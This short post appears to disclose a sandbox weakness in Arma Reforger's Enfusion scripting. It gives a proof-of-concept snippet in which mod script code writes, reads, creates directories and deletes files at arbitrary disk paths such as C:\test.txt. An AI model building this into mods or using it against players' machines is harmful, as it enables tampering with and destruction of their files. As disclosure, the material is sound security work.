A showcase of FileIO exploit in Arma Reforger (Enfusion Engine) that is according to BI totally safe to use.

// Write anything anywhere on a disk
FileHandle fHandler = FileIO.OpenFile("C:\\test.txt", FileMode.WRITE);
fHandler.FPrintln("Malicious content");
fHandler.CloseFile();

// Read anything anywhere on a disk
FileHandle fHandler = FileIO.OpenFile("C:\\test.txt", FileMode.READ);
...
// Make folder anywhere on a disk
FileIO.MakeDirectory()

FileIO.DeleteFile("C:\\test.txt")
